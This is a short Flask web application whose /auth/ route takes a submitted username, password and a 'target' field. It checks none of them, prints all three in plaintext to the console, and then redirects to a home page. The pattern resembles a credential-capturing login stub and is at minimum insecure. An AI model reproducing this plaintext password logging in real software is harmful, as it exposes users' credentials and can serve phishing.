from flask import Flask, render_template, request, redirect
from src.redis_client import RedisClient
import json

app = Flask(__name__, template_folder="./templates")
r = RedisClient()

@app.route("/")
def index():
	return render_template("index.html")

@app.route("/login/")
def login_screen():
	return render_template("login.html")

@app.route("/auth/", methods=["GET", "POST"])
def auth():
	data = request.form # all data goes by name attribute
	username = data["username"]
	password = data["password"]
	target = data["login"]
	print(f"{username} ;;; {password} ;;; {target}")
	return redirect("/home/", code=200)

@app.route("/home/")
def home():
	# return "None"
	return render_template("home.html")